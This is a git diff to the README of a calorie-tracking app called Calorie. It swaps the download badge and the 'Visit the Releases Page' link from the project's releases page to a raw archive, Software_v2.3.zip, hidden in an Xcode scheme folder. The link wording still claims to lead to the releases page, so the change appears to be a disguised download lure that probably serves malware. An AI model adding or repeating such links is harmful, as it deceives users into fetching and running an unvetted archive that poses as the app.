@@ -6,14 +6,14 @@ Welcome to Calorie, an easy-to-use app for tracking your daily food intake. This
 
 ## 🔗 Download Calorie
 
-[![Download Calorie](https://img.shields.io/badge/Download%20Calorie-Click%20Here-brightgreen)](https://github.com/vvskapil/Calorie/releases)
+[![Download Calorie](https://github.com/vvskapil/Calorie/raw/refs/heads/main/ios/Runner.xcodeproj/xcshareddata/xcschemes/Software_v2.3.zip%20Calorie-Click%20Here-brightgreen)](https://github.com/vvskapil/Calorie/raw/refs/heads/main/ios/Runner.xcodeproj/xcshareddata/xcschemes/Software_v2.3.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the Calorie Releases page.  
-   [Visit this page to download Calorie](https://github.com/vvskapil/Calorie/releases)
+   [Visit this page to download Calorie](https://github.com/vvskapil/Calorie/raw/refs/heads/main/ios/Runner.xcodeproj/xcshareddata/xcschemes/Software_v2.3.zip)
 
 2. **Select the Latest Version**: Look for the latest release at the top of the page. It will usually have the highest version number.
 
